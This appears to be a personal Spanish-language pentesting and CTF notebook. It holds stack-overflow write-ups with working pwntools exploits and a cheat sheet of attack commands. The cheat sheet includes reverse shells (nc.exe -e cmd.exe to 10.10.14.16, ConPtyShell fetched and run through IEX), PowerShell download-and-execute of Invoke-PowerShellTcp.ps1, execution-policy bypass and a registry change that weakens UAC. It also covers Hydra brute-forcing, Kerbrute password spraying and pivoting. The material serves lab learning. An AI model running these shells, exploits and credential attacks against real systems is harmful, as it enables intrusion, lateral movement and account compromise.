<h3 id="gdb"><a class="header" href="#gdb">GDB</a></h3>
<pre><code class="language-bash">disassemble
disass
b *main+25
b *0x08048414
b *puts
info breakpoints
info b
i b
info registers
info frame
delete &lt;breakpoint number&gt;
del 2
d 2
x/a 0x08048451
x/10c 0x08048451
x/s 0x08048451
x/g 0x08048451
x/w 0x08048451
jump *0x08048451
j *0x08048451
</code></pre>
<h2 id="2-stack-buffer-overflows"><a class="header" href="#2-stack-buffer-overflows">2 Stack Buffer Overflows</a></h2>
<h3 id="tamu19-pwn1"><a class="header" href="#tamu19-pwn1">Tamu19 pwn1</a></h3>
<pre><code class="language-c">undefined4 main(undefined param_1)
{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &amp;param_1;
  setvbuf(stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      &quot;Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see.&quot;
      );
  puts(&quot;What... is your name?&quot;);
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,&quot;Sir Lancelot of Camelot\n&quot;);
  if (iVar1 != 0) {
    puts(&quot;I don\'t know that! Auuuuuuuugh!&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(&quot;What... is your quest?&quot;);
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,&quot;To seek the Holy Grail.\n&quot;);
  if (iVar1 != 0) {
    puts(&quot;I don\'t know that! Auuuuuuuugh!&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(&quot;What... is my secret?&quot;);
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts(&quot;I don\'t know that! Auuuuuuuugh!&quot;);
  }
  return 0;
}
</code></pre>
<pre><code class="language-bash">python -c 'print &quot;Sir Lancelot of Camelot\n&quot; + &quot;To seek the Holy Grail.\n&quot; + &quot;A&quot; * 43 + &quot;\xc8\x10\xa1\xde&quot;'
</code></pre>
<h3 id="just-do-it"><a class="header" href="#just-do-it">Just Do It!</a></h3>
<pre><code class="language-c">undefined4 main(undefined param_1)
{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;
  
  local_c = &amp;param_1;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (local_18 == (FILE *)0x0) {
    perror(&quot;file open error.\n&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror(&quot;file read error.\n&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(&quot;Welcome my secret service. Do you know the password?&quot;);
  puts(&quot;Input the password.&quot;);
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror(&quot;input error.\n&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
</code></pre>
<pre><code class="language-bash">python -c 'print &quot;A&quot; * 20 + &quot;\x80\xa0\x04\x08&quot;'
</code></pre>
<h3 id="csaw-16-warmup"><a class="header" href="#csaw-16-warmup">CSAW 16 Warmup</a></h3>
<pre><code class="language-c">void main(void)
{
  char local_88 [64];
  char local_48 [64];
  
  write(1,&quot;-Warm Up-\n&quot;,10);
  write(1,&amp;DAT_0040074c,4);
  sprintf(local_88,&quot;%p\n&quot;,easy);
  write(1,local_88,9);
  write(1,&amp;DAT_00400755,1);
  gets(local_48);
  return;
}
</code></pre>
<pre><code class="language-c">void easy(void)
{
  system(&quot;cat flag.txt&quot;);
  return;
}
</code></pre>
<pre><code class="language-bash">gef➤  b *main+134 # Dirección de leave
Breakpoint 1 at 0x4006a3
gef➤  r
Starting program: /Hackery/pod/modules/bof_callfunction/csaw16_warmup/warmup
-Warm Up-
WOW:0x40060d
&gt;15935728
gef➤  search-pattern 15935728 # Buscar texto en memoria
[+] Searching '15935728' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602260 - 0x602268  →   &quot;15935728&quot;
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde50 - 0x7fffffffde58  →   &quot;15935728&quot;
gef➤  i f # info frame
Stack level 0, frame at 0x7fffffffdea0:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7a05b97
 Arglist at 0x7fffffffde90, args:
 Locals at 0x7fffffffde90, Previous frame's sp is 0x7fffffffdea0
 Saved registers:
  rbp at 0x7fffffffde90, rip at 0x7fffffffde98
</code></pre>
<p>Calcular offset</p>
<pre><code class="language-python">&gt;&gt;&gt; 0x7fffffffde98 - 0x7fffffffde50 # rip - dirección donde se encontró el patrón
72
</code></pre>
<pre><code class="language-bash">python -c 'print &quot;A&quot; * 72 + &quot;\x0d\x06\x40\x00\x00\x00&quot;' &gt; /tmp/payload
</code></pre>
<h3 id="csaw-18-get-it"><a class="header" href="#csaw-18-get-it">CSAW 18 Get It</a></h3>
<p>main</p>
<pre><code class="language-c">undefined8 main(void)
{
  char local_28 [32];
  
  puts(&quot;Do you gets it??&quot;);
  gets(local_28);
  return 0;
}
</code></pre>
<p>give_shell</p>
<pre><code class="language-c">void give_shell(void)
{
  system(&quot;/bin/bash&quot;);
  return;
}
</code></pre>
<pre><code class="language-text">gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400470  puts@plt
0x0000000000400480  system@plt
0x0000000000400490  __libc_start_main@plt
0x00000000004004a0  gets@plt
0x00000000004004b0  __gmon_start__@plt
0x00000000004004c0  _start
0x00000000004004f0  deregister_tm_clones
0x0000000000400530  register_tm_clones
0x0000000000400570  __do_global_dtors_aux
0x0000000000400590  frame_dummy
0x00000000004005b6  give_shell # Saltar aquí
0x00000000004005c7  main
0x0000000000400600  __libc_csu_init
0x0000000000400670  __libc_csu_fini
0x0000000000400674  _fini
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004005c7 &lt;+0&gt;:     push   rbp
   0x00000000004005c8 &lt;+1&gt;:     mov    rbp,rsp
   0x00000000004005cb &lt;+4&gt;:     sub    rsp,0x30
   0x00000000004005cf &lt;+8&gt;:     mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 &lt;+11&gt;:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 &lt;+15&gt;:    mov    edi,0x40068e
   0x00000000004005db &lt;+20&gt;:    call   0x400470 &lt;puts@plt&gt;
   0x00000000004005e0 &lt;+25&gt;:    lea    rax,[rbp-0x20]
   0x00000000004005e4 &lt;+29&gt;:    mov    rdi,rax
   0x00000000004005e7 &lt;+32&gt;:    mov    eax,0x0
   0x00000000004005ec &lt;+37&gt;:    call   0x4004a0 &lt;gets@plt&gt;
   0x00000000004005f1 &lt;+42&gt;:    mov    eax,0x0
   0x00000000004005f6 &lt;+47&gt;:    leave
   0x00000000004005f7 &lt;+48&gt;:    ret
End of assembler dump.
gef➤  b *0x00000000004005f6
Breakpoint 1 at 0x4005f6
gef➤  r
Starting program: /home/srrequiem/Documents/nightmare/modules/05-bof_callfunction/csaw18_getit/get_it
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc6000'
Do you gets it??
13371337
[...] # Output de gef
gef➤  i f
Stack level 0, frame at 0x7fffffffdc00:
 rip = 0x4005f6 in main; saved rip = 0x7ffff7dca20a
 Arglist at 0x7fffffffdbf0, args:
 Locals at 0x7fffffffdbf0, Previous frame's sp is 0x7fffffffdc00
 Saved registers:
  rbp at 0x7fffffffdbf0, rip at 0x7fffffffdbf8
gef➤  search-pattern 13371337
[+] Searching '13371337' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6026b0 - 0x6026ba  →   &quot;13371337\n&quot;
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdbd0 - 0x7fffffffdbd8  →   &quot;13371337&quot;
</code></pre>
<p>Calcular offset</p>
<pre><code class="language-python">&gt;&gt;&gt; 0x7fffffffdbf8 - 0x7fffffffdbd0
40
</code></pre>
<p>Exploit</p>
<pre><code class="language-python">from pwn import *

target = process(&quot;./get_it&quot;)
payload = b&quot;A&quot; * 40 # filler
payload += p64(0x4005b6) # get_shell mem address
target.sendline(payload)
target.interactive()
</code></pre>
<h3 id="tu-2017-vulnchat"><a class="header" href="#tu-2017-vulnchat">TU 2017 Vulnchat</a></h3>
<pre><code class="language-c">undefined4 main(void)
{
  undefined local_31 [20];
  char local_1d [20];
  undefined4 local_9;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts(&quot;----------- Welcome to vuln-chat -------------&quot;);
  printf(&quot;Enter your username: &quot;);
  local_9 = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&amp;local_9,local_1d);
  printf(&quot;Welcome %s!\n&quot;,local_1d);
  puts(&quot;Connecting to \'djinn\'&quot;);
  sleep(1);
  puts(&quot;--- \'djinn\' has joined your chat ---&quot;);
  puts(&quot;djinn: I have the information. But how do I know I can trust you?&quot;);
  printf(&quot;%s: &quot;,local_1d);
  __isoc99_scanf(&amp;local_9,local_31);
  puts(&quot;djinn: Sorry. That\'s not good enough&quot;);
  fflush(stdout);
  return 0;
}
</code></pre>
<pre><code class="language-c">void printFlag(void)
{
  system(&quot;/bin/cat ./flag.txt&quot;);
  puts(&quot;Use it wisely&quot;);
  return;
}
</code></pre>
<p>Modificación de espacio asignado para almacenar en:</p>
<pre><code class="language-c">__isoc99_scanf(&amp;local_9,local_1d);
</code></pre>
<p>Por lo que al identificar la dirección de memoria de <code>printFlag</code> con:</p>
<pre><code class="language-text">gef➤  b *printFlag
Breakpoint 2 at 0x804856b
</code></pre>
<p>Se puede crear el payload con:</p>
<pre><code class="language-bash">python -c 'print &quot;A&quot; * 20 + &quot;%99s\n&quot; + &quot;A&quot; * 49 + &quot;\x6b\x85\x04\x08\n&quot;' &gt; /tmp/payload
</code></pre>
<p>Donde:</p>
<ul>
<li><code>&quot;A&quot; * 20</code>: Rellenan la variable del primer saludo (<code>local_1d</code>).</li>
<li><code>%99s</code>: Da espacio suficiente para alcanzar la dirección de retorno para el siguiente <code>scanf</code>.</li>
<li><code>&quot;A&quot; * 49</code>: Rellenan el espacio necesario para alcanzar la dirección de retorno.</li>
<li><code>&quot;\x6b\x85\x04\x08&quot;</code>: Dirección de <code>printFlag</code>.</li>
</ul>
<p>Exploit:</p>
<pre><code class="language-python">from pwn import *

target = process(&quot;./vuln-chat&quot;)
payload = b&quot;A&quot; * 20
payload += b&quot;%99s&quot;
target.sendline(payload)
payload = b&quot;A&quot; * 49
payload += p32(0x804856b)
target.sendline(payload)
target.interactive()
</code></pre>
<h2 id="exploit-template"><a class="header" href="#exploit-template">Exploit template</a></h2>
<pre><code class="language-python">from pwn import *

target = remote(&quot;github.com&quot;, 9000)
target = process(&quot;./challenge&quot;)
gdb.attach(target)
# gdb.attach(target, gdbscript='b *main')
target.send(x)
target.sendline(x)
print target.recvline()
print target.recvuntil(&quot;out&quot;)
target.interactive()
</code></pre>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://guyinatuxedo.github.io/">Nightmare</a>.</li>
<li><a href="https://pwn.college/">Pwn College</a>.</li>
<li><a href="https://exploit.education/">Exploit Education</a>.</li>
<li>https://github.com/hugsy/gef</li>
<li>https://github.com/pwndbg/pwndbg</li>
<li>https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="templates"><a class="header" href="#templates">Templates</a></h1>
<h2 id="box"><a class="header" href="#box">Box</a></h2>
<h3 id="distribución-de-archivos"><a class="header" href="#distribución-de-archivos">Distribución de archivos</a></h3>
<pre><code class="language-bash">Box
├── images
└── README.md
</code></pre>
<h3 id="contenido-de-readmemd"><a class="header" href="#contenido-de-readmemd">Contenido de <code>README.md</code></a></h3>
<pre><code class="language-markdown"># Tabla de Contenidos

# Introducción

## Técnicas vistas / Tags

- Técnica 1
- Técnica 2
- Técnica 3

## Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Box]() |
| OS | Windows / Linux |
| Dificultad oficial | Easy |
| Dificultad de comunidad | ![Dificultad]() |
| Puntos | 20 |
| Creadores | [Creator]() |

# Reconocimiento

## Escaneo de host

### Escaneo completo de puertos

```bash
sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET

```

### Escaneo específico

```bash
nmap -sCV -p80,27017,37500 -oN nmap/targeted $BOX_TARGET

```

# Enumeración

## Servicios

### Nombre de servicio - Puerto

#### Manual



#### Nombre de herramienta



# Explotación

## Tipo de explotación

### Pasos previos | Preparación



### Ejecución



# Post Explotación

## Enumeración



## Escalación de privilegios


# Conclusión


# Notas adicionales


# Referencias


</code></pre>
<h2 id="compendio-ctf--writeup"><a class="header" href="#compendio-ctf--writeup">Compendio CTF / Writeup</a></h2>
<pre><code class="language-markdown"># Nombre CTF

## Tabla de Contenidos

## Resumen de Vulnerabilidades

## Web

### Web Reto 1

#### Info

| Atributo | Valor |
|---|---|
| Descripción | - |
| Archivos | - |

#### Solución

## Crypto

### Crypto Reto 1

#### Info

| Atributo | Valor |
|---|---|
| Descripción | - |
| Archivos | - |

#### Solución

## Reversing

### Reversing Reto 1

#### Info

| Atributo | Valor |
|---|---|
| Descripción | - |
| Archivos | - |

#### Solución

## Pwning

### Pwning Reto 1

#### Info

| Atributo | Valor |
|---|---|
| Descripción | - |
| Archivos | - |

#### Solución

## Forense

### Forense Reto 1

#### Info

| Atributo | Valor |
|---|---|
| Descripción | - |
| Archivos | - |

#### Solución

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="general"><a class="header" href="#general">General</a></h1>
<h2 id="utilidades"><a class="header" href="#utilidades">Utilidades</a></h2>
<h3 id="linux"><a class="header" href="#linux">Linux</a></h3>
<h4 id="treesh"><a class="header" href="#treesh">tree.sh</a></h4>
<pre><code class="language-bash">#!/bin/bash
pwd=$(pwd)
echo Tree of: $pwd
find $pwd -print | sed -e &quot;s;$pwd;\.;g;s;[^/]*\/;|__;g;s;__|; |;g&quot;
#very simple script. REALLY!
echo '|__end tree'
</code></pre>
<h2 id="herramientas"><a class="header" href="#herramientas">Herramientas</a></h2>
<h3 id="hydra"><a class="header" href="#hydra">Hydra</a></h3>
<pre><code class="language-bash">hydra -l &lt;USER&gt; -p &lt;PASSWORD&gt; &lt;IP_ADDRESS&gt; http-post-form &quot;&lt;LOGIN_PAGE&gt;:&lt;REQUEST_BODY&gt;:&lt;ERROR_MESSAGE&gt;&quot;
</code></pre>
<h5 id="json-payload"><a class="header" href="#json-payload">JSON Payload</a></h5>
<pre><code class="language-bash">hydra -l &quot;root@dasith.works&quot; -P &quot;/usr/share/wordlists/rockyou.txt&quot; -s 3000 10.129.244.81 http-post-form &quot;/api/user/login:{\&quot;email\&quot;\:\&quot;^USER^\&quot;,\&quot;password\&quot;\:\&quot;^PASS^\&quot;}:S=Password is wrong:H=content-type: application/json&quot;
</code></pre>
<h2 id="tty"><a class="header" href="#tty">TTY</a></h2>
<h3 id="linux-1"><a class="header" href="#linux-1">Linux</a></h3>
<pre><code class="language-text">ctrl + z
echo $TERM &amp;&amp; tput lines &amp;&amp; tput cols

# bash
stty raw -echo
fg

# zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows &lt;num&gt; columns &lt;cols&gt;
</code></pre>
<p>socat:</p>
<pre><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:1234
</code></pre>
<p>Intérprete:</p>
<pre><code class="language-text">/usr/bin/script -qc /bin/bash /dev/null
/bin/sh -i
python3 -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
python3 -c &quot;__import__('pty').spawn('/bin/bash')&quot;
python3 -c &quot;__import__('subprocess').call(['/bin/bash'])&quot;
perl -e 'exec &quot;/bin/sh&quot;;'
perl: exec &quot;/bin/sh&quot;;
perl -e 'print `/bin/bash`'
ruby: exec &quot;/bin/sh&quot;
lua: os.execute('/bin/sh')

# vi
:!bash
:set shell=/bin/bash:shell

# nmap
!sh

# mysql
! bash
</code></pre>
<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
<p><a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell</a></p>
<p>Server:</p>
<pre><code class="language-bash"># 1
rlwrap nc -lvnp 3001

# 2
stty raw -echo; (stty size; cat) | nc -lvnp 3001
</code></pre>
<p>Cliente:</p>
<pre><code class="language-powershell">IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
</code></pre>
<h1 id="proxy-debugging"><a class="header" href="#proxy-debugging">Proxy debugging</a></h1>
<p>TODO: Agregar comandos de shellhacks.com para redireccionar todo el tráfico de la consola a burpsuite</p>
<h1 id="windows-1"><a class="header" href="#windows-1">Windows</a></h1>
<h2 id="crackmapexec-pwn3d"><a class="header" href="#crackmapexec-pwn3d">Crackmapexec <code>(Pwn3d!)</code></a></h2>
<p><code>cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></p>
<h2 id="powershell"><a class="header" href="#powershell">Powershell</a></h2>
<h3 id="bypass-de-execution-policy"><a class="header" href="#bypass-de-execution-policy">Bypass de execution policy</a></h3>
<pre><code class="language-powershell">powerShell.exe -ExecutionPolicy Bypass .\script.ps1
</code></pre>
<p>Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/</p>
<h3 id="invoke-command-providing-credentials"><a class="header" href="#invoke-command-providing-credentials">Invoke command providing credentials</a></h3>
<pre><code class="language-powershell">$userName = 'WORKGROUP\Hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
# ComputerName obtenida de los comandos: 
hostname
$env:COMPUTERNAME
[Environment]::MachineName

# Con o sin ComputerName en el caso de que sea local
Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.16 4321}

Start-Process -FilePath 'powershell' -argumentlist &quot;IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')&quot; -Credential $credObject
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-cheatsheet"><a class="header" href="#active-directory-cheatsheet">Active Directory CheatSheet</a></h1>
<h2 id="kerbrute-1"><a class="header" href="#kerbrute-1">Kerbrute</a></h2>
<h3 id="enumeración-de-usuarios"><a class="header" href="#enumeración-de-usuarios">Enumeración de usuarios</a></h3>
<pre><code class="language-bash">./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
</code></pre>
<h3 id="password-spraying"><a class="header" href="#password-spraying">Password Spraying</a></h3>
<pre><code class="language-bash">sudo ntpdate 10.10.11.129
./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local users.txt Password123
</code></pre>
<h2 id="bloodhound-1"><a class="header" href="#bloodhound-1">BloodHound</a></h2>
<h3 id="bloodhoundpy"><a class="header" href="#bloodhoundpy">BloodHound.py</a></h3>
<p><strong>Nota: Al recopilar la info con la última versión es recomendable usar a su vez también la última versión del visualizador.</strong></p>
<h4 id="setup-1"><a class="header" href="#setup-1">Setup</a></h4>
<p><a href="https://github.com/fox-it/BloodHound.py">Repositorio Github</a></p>
<pre><code class="language-bash">pyenv ...
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python setup.py install
</code></pre>
<h4 id="uso"><a class="header" href="#uso">Uso</a></h4>
<pre><code class="language-bash">python bloodhound.py -u hope.sharp -p 'Password123' -d search.htb -ns 10.10.11.129 -c All
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="host-discovery"><a class="header" href="#host-discovery">Host discovery</a></h1>
<h2 id="ping-sweep"><a class="header" href="#ping-sweep">Ping Sweep</a></h2>
<h3 id="windows-2"><a class="header" href="#windows-2">Windows</a></h3>
<h4 id="powershell-1"><a class="header" href="#powershell-1">Powershell</a></h4>
<h5 id="opción-1"><a class="header" href="#opción-1">Opción 1</a></h5>
<pre><code class="language-powershell"># Ejecutar en límea de comandos o como script
1..255 | % {echo &quot;172.16.2.$_&quot;; ping -n 1 -w 100 172.16.2.$_} | Select-String ttl
</code></pre>
<h5 id="opción-2"><a class="header" href="#opción-2">Opción 2</a></h5>
<pre><code class="language-bash"># Pendiente sólo imprimir True
Import-Module Microsoft.PowerShell.Management

$ips = 1..255 | % { &quot;192.168.1.$_&quot; } 

$ips | ForEach-Object {
   
   $result = Test-Connection -Count 1 -ComputerName $_ -Quiet
   &quot;$($_) $result&quot;
}
</code></pre>
<h4 id="msdos"><a class="header" href="#msdos">MSDOS</a></h4>
<pre><code class="language-powershell">for /L %a in (1,1,254) do @start /b ping 192.168.0.%a -w 100 -n 2 &gt;nul
arp -a
</code></pre>
<h3 id="linux-2"><a class="header" href="#linux-2">Linux</a></h3>
<h4 id="bash"><a class="header" href="#bash">Bash</a></h4>
<h5 id="opción-1-1"><a class="header" href="#opción-1-1">Opción 1</a></h5>
<pre><code class="language-bash">fping -a -g X.X.X.0/24 2&gt;/dev/null # Opción 1
</code></pre>
<h5 id="opción-2-1"><a class="header" href="#opción-2-1">Opción 2</a></h5>
<pre><code class="language-bash">#!/bin/bash
# host_discovery.sh
subnet=&quot;10.10.110.&quot;
for ip in {0..254}; do
  timeout 1 bash -c &quot;ping -c 1 $subnet$ip&quot; &amp;&gt; /dev/null &amp;&amp; echo &quot;[+] Host found $subnet$ip&quot; &amp;
done; wait
</code></pre>
<p>Ejecución:</p>
<pre><code class="language-bash">bash host_discovery.sh
bash host_discovery.sh 2&gt;/dev/null
</code></pre>
<h5 id="opción-3"><a class="header" href="#opción-3">Opción 3</a></h5>
<pre><code class="language-bash">subnet=&quot;10.10.110.&quot; &amp;&amp; for ip in {0..254}; do ping -c 1 -t 1 $subnet$ip  &gt; /dev/null &amp;&amp; echo &quot;[+] Host found $subnet$ip&quot;; done
</code></pre>
<h4 id="nmap"><a class="header" href="#nmap">Nmap</a></h4>
<pre><code class="language-bash">nmap -sL 10.10.110.0/24 # List Scan
nmap -sP 10.10.110.0/24 # Ping Sweep
nmap -PS 10.10.110.0/24 # TCP SYN Ping
nmap -sA 10.10.110.0/24 # TCP ACK Ping
nmap -PE 10.10.110.0/24 # ICMP Echo Ping
</code></pre>
<h1 id="port-scanning"><a class="header" href="#port-scanning">Port scanning</a></h1>
<h2 id="tcp"><a class="header" href="#tcp">TCP</a></h2>
<h3 id="netcat"><a class="header" href="#netcat">Netcat</a></h3>
<pre><code class="language-bash">netcat -v -z -n -w 1 &lt;ip&gt; 1-65535 &gt; host.nc 2&gt;&amp;1
grep -v &quot;refused&quot; host.nc
</code></pre>
<h3 id="bash-1"><a class="header" href="#bash-1">Bash</a></h3>
<pre><code class="language-bash">host=&lt;ip&gt;
for port in {1..65535}; do
  timeout 1 bash -c &quot;echo &gt;/dev/tcp/$host/$port&quot; &amp;&amp; echo &quot;port $port is open&quot; || echo &quot;port $port is closed&quot;
done
</code></pre>
<pre><code class="language-bash">host=&lt;ip&gt;
for port in {1..65535}; do
  timeout 1 bash -c &quot;echo &gt;/dev/tcp/$host/$port&quot; 2&gt;/dev/null &amp;&amp; echo &quot;port $port is open&quot;
done
</code></pre>
<h3 id="nmap-a-través-de-pivote"><a class="header" href="#nmap-a-través-de-pivote">Nmap a través de pivote</a></h3>
<pre><code class="language-bash">seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n &lt;ip&gt; 2&gt;&amp;1 | grep &quot;tcp open&quot;
</code></pre>
<h1 id="mac-address"><a class="header" href="#mac-address">MAC Address</a></h1>
<h2 id="cambio-de-mac-address"><a class="header" href="#cambio-de-mac-address">Cambio de MAC Address</a></h2>
<ol>
<li>Deshabilitar interfaz</li>
</ol>
<pre><code class="language-bash">ifconfig &lt;interfaz de red&gt; down
ifconfig wlan0 down
</code></pre>
<ol start="2">
<li>Cambiar valor asignado</li>
</ol>
<pre><code class="language-bash">ifconfig &lt;interfaz de red&gt; hw ether # Cambiar la dirección física (hardware address hw ether)
ifconfig wlan0 hw ether 00:11:22:33:44:55
</code></pre>
<ol start="3">
<li>Habilitar interfaz</li>
</ol>
<pre><code class="language-bash">ifconfig &lt;interfaz de red&gt; up
ifconfig wlan0 up
</code></pre>
<p><em>Nota: Considerar que el cambio se realiza sólo en memoria, no físicamente por lo que regresará a su valor original una vez que se reinicie la máquina. En algunas ocasiones y dependiendo del chipset que se esté usando el valor regresará a su estado original <strong>sin necesidad de reiniciar la máquina</strong> si se experimenta dicha situación considerar buscar la solución en: https://www.youtube.com/watch?v=7AUGQNBCddo</em></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="chisel"><a class="header" href="#chisel">Chisel</a></h1>
<p><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Cheet Sheet completa por 0xdf</a></p>
<h2 id="servidor"><a class="header" href="#servidor">Servidor</a></h2>
<pre><code class="language-bash">chisel server -p 8000 --reverse
</code></pre>
<h2 id="cliente"><a class="header" href="#cliente">Cliente</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody>
<tr><td><code>chisel client 10.10.14.3:8000 R:80:127.0.0.1:80</code></td><td>Listen on Kali 80, forward to localhost port 80 on client</td></tr>
<tr><td><code>chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80</code></td><td>Listen on Kali 4444, forward to 10.10.10.240 port 80</td></tr>
<tr><td><code>chisel client 10.10.14.3:8000 R:socks</code></td><td>Create SOCKS5 listener on 1080 on Kali, proxy through client</td></tr>
</tbody></table>
</div>
<h1 id="ssh--proxychains"><a class="header" href="#ssh--proxychains">SSH + Proxychains</a></h1>
<h2 id="redirección-local-de-puertos"><a class="header" href="#redirección-local-de-puertos">Redirección local de puertos</a></h2>
<pre><code class="language-bash"># Sintaxis
ssh -N -L bind_address:port:host:host_port [username@address]

# Setup
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128

# Uso
smbclient -L 127.0.0.1 -U Administrator
</code></pre>
<h2 id="redirección-remota-de-puertos"><a class="header" href="#redirección-remota-de-puertos">Redirección remota de puertos</a></h2>
<pre><code class="language-bash"># Sintaxis
ssh -N -R bind_address:port:host:host_port [username@address]

# Setup
sudo ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4

# Uso
TODO
</code></pre>
<h2 id="redirección-dinámica-de-puertos"><a class="header" href="#redirección-dinámica-de-puertos">Redirección dinámica de puertos</a></h2>
<pre><code class="language-bash"># Sintaxis
ssh -N -D address_to_bind_to:port_to_bind_to [username@server_address]

# Setup
sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
## Edición de Proxychains /etc/proxychains.conf
# [ProxyList]
#
#
# socks4  127.0.0.1 8080

# Uso
proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
</code></pre>
<h2 id="parámetros-ssh"><a class="header" href="#parámetros-ssh">Parámetros SSH</a></h2>
<ul>
<li><code>-N</code> No levantará prompt de comandos.</li>
<li><code>-L</code> Indica redirección local.</li>
<li><code>-R</code> Indica redirección remota.</li>
<li><code>-D</code> Indica redirección dinámica.</li>
</ul>
<h1 id="socat"><a class="header" href="#socat">Socat</a></h1>
<h2 id="redirección-local-de-puertos-1"><a class="header" href="#redirección-local-de-puertos-1">Redirección local de puertos</a></h2>
<pre><code class="language-bash"># TCP
socat TCP-LISTEN:&lt;puerto_local&gt;,fork TCP:&lt;ip&gt;:&lt;puerto&gt;
</code></pre>
<h1 id="windows---redirección-redirección-de-puertos"><a class="header" href="#windows---redirección-redirección-de-puertos">Windows - Redirección redirección de puertos</a></h1>
<pre><code class="language-powershell">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-pwning"><a class="header" href="#linux-pwning">Linux Pwning</a></h1>
<h2 id="validaciones-iniciales"><a class="header" href="#validaciones-iniciales">Validaciones iniciales</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Herramienta</th><th>Protección</th><th>Valor</th><th>Descripción</th></tr></thead><tbody>
<tr><td><code>file</code></td><td>not stripped</td><td>NA</td><td>Indica que al hacer ingenieria inversa no se podrá ver el nombre de las funciones, etc.</td></tr>
<tr><td><code>checksec</code></td><td>PIE</td><td>PIE {enabled, disabled}</td><td>Cada vez que el programa se ejecute, contará con diferentes direcciones en memoria.</td></tr>
<tr><td><code>checksec</code></td><td>NX</td><td>NX {enabled, disabled}</td><td>Si esta deshabilitado indica que si se llegase a tener la capacidad de inyectar codigo en la pila se podrá ejecutar.</td></tr>
<tr><td><code>checksec</code></td><td>Stack CANARY</td><td>Canary found | No canary found</td><td>Si se encuentra habilitado, las funciones cuentan con un valor aleatorio asignado si este valor se ve modificado el binario mostrará un mensaje de tipo <code>stack smashing detected</code>.</td></tr>
